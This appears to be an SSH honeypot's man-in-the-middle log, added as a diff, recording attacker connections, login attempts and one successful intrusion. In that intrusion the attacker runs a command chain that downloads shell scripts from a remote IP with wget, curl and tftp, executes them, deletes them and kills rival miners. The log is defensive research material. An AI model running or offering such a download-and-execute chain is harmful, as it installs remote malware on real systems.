@@ -1,0 +1,44 @@
+2020-10-29 14:25:46.665 - [Info] MITM Version: 1.26
+2020-10-29 14:25:46.671 - [Info] Auto Access Enabled: true
+2020-10-29 14:25:46.672 - [Debug] [Init] Auto Access Barrier: true
+2020-10-29 14:25:46.694 - [Info] SSH man-in-the-middle server for 172.20.0.202 listening on 0.0.0.0:10001
+2020-10-29 14:26:00.299 - [Debug] [Connection] Attacker connected: 193.151.128.135 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-10-29 14:26:02.307 - [Debug] [Auth] Attacker 193.151.128.135 trying to authenticate with "password"
+2020-10-29 14:26:02.309 - [Debug] [Auto Access] Attacker: 193.151.128.135, Threshold: 1, Attempts: 1
+2020-10-29 14:26:02.309 - [Debug] [Auto Access] Compromising the honeypot
+2020-10-29 14:26:02.309 - [Debug] [Auto Access] Adding the following credentials: "ftpuser:ftpuser"
+2020-10-29 14:26:02.763 - [Debug] [Auth] Valid credentials - Password Authentication
+2020-10-29 14:26:02.764 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.202
+2020-10-29 14:26:02.859 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2020-10-29 14:26:03.612 - [Debug] [EXEC] Noninteractive mode attacker command: wget http://45.145.185.25/wash.sh; curl -O http://45.145.185.25/wash.sh; chmod 777 wash.sh; sh wash.sh; cd /tmp; wget http://45.145.185.25/bins.sh; chmod 777 *; sh bins.sh; tftp -g 45.145.185.25 -r tftp.sh; chmod 777 *; sh tftp.sh; rm -rf *.sh; pkill node; pkill fri; pkill xmrig; pkill ssh
+2020-10-29 14:26:06.431 - [Debug] [Connection] Attacker connected: 193.105.134.45 | Client Identification: SSH-2.0-OpenSSH_3.9p1
+2020-10-29 14:26:08.139 - [Debug] [Auth] Attacker 193.105.134.45 trying to authenticate with "none"
+2020-10-29 14:26:08.139 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2020-10-29 14:26:08.429 - [Debug] [Auth] Attacker 193.105.134.45 trying to authenticate with "password"
+2020-10-29 14:26:08.430 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-10-29 14:26:08.431 - [Debug] [Auth] Attacker: 193.105.134.45 has so far made 1 attempts. Remaining: 5 attempts
+2020-10-29 14:26:08.724 - [Debug] [Connection] Attacker closed the connection
+2020-10-29 14:26:14.722 - [Debug] [Connection] Attacker connected: 193.151.128.135 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-10-29 14:26:16.680 - [Debug] [Auth] Attacker 193.151.128.135 trying to authenticate with "password"
+2020-10-29 14:26:16.681 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-10-29 14:26:16.682 - [Debug] [Auth] Attacker: 193.151.128.135 has so far made 1 attempts. Remaining: 5 attempts
+2020-10-29 14:26:17.131 - [Debug] [Connection] Attacker closed the connection
+2020-10-29 14:26:31.291 - [Debug] [Connection] Attacker connected: 193.151.128.135 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-10-29 14:26:33.336 - [Debug] [Connection] Attacker closed the connection
+2020-10-29 14:26:45.107 - [Debug] [Connection] Attacker closed connection
+2020-10-29 14:26:45.128 - [Debug] [LXC] Container's OpenSSH server ended connection
+2020-10-29 14:26:45.129 - [Debug] [LXC] Container's OpenSSH server closed connection
+2020-10-29 14:29:37.772 - [Debug] [Connection] Attacker connected: 195.3.147.47 | Client Identification: SSH-2.0-PuTTY_Release_0.61
+2020-10-29 14:29:38.878 - [Debug] [Auth] Attacker 195.3.147.47 trying to authenticate with "none"
+2020-10-29 14:29:38.878 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2020-10-29 14:29:39.138 - [Debug] [Auth] Attacker 195.3.147.47 trying to authenticate with "password"
+2020-10-29 14:29:39.139 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-10-29 14:29:39.140 - [Debug] [Auth] Attacker: 195.3.147.47 has so far made 1 attempts. Remaining: 5 attempts
+2020-10-29 14:29:39.397 - [Debug] [Connection] Attacker closed the connection
+2020-10-29 14:30:43.685 - [Debug] [Connection] Attacker connected: 193.105.134.45 | Client Identification: SSH-2.0-PuTTY_Release_0.62
+2020-10-29 14:30:45.256 - [Debug] [Auth] Attacker 193.105.134.45 trying to authenticate with "none"
+2020-10-29 14:30:45.256 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2020-10-29 14:30:45.535 - [Debug] [Auth] Attacker 193.105.134.45 trying to authenticate with "password"
+2020-10-29 14:30:45.537 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Container user is disabled
+2020-10-29 14:30:45.538 - [Debug] [Auth] Attacker: 193.105.134.45 has so far made 1 attempts. Remaining: 5 attempts
+2020-10-29 14:30:45.816 - [Debug] [Connection] Attacker closed the connection
